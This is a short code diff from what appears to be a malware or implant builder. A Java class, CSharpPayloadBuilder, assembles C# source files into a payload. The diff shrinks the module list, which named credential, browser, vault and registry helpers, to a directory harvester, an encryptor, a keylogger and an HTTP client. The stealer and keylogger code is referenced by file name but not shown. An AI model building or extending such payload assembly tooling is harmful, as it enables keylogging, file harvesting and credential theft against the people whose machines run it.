@@ -6,10 +6,7 @@ import java.io.IOException;
 
 public class CSharpPayloadBuilder {
 	public static String buildPayload(String path) throws IOException {
-		String args[] = {"common\\encryptor.cs", "common\\permissions.cs", "common\\registry.cs", "common\\event_helper.cs", "common\\chrome_helper.cs", "common\\cred_helper.cs",
-				"common\\firefox.cs", "common\\ie_helper.cs", "common\\network_helper.cs", "common\\process_scanner.cs",
-				"common\\sysinfo.cs", "common\\vault_helper.cs", "common\\cs_keylogger.cs", "common\\client.cs", "http_client.cs"};
-		
+		String args[] = {"common\\directory_harvester.cs", "common\\encryptor.cs", "common\\cs_keylogger.cs", "common\\client.cs", "http_client.cs"};
 		StringBuilder sb = new StringBuilder();
 		
 		BufferedReader br = new BufferedReader(new FileReader(path + "\\common\\master_import.cs"));
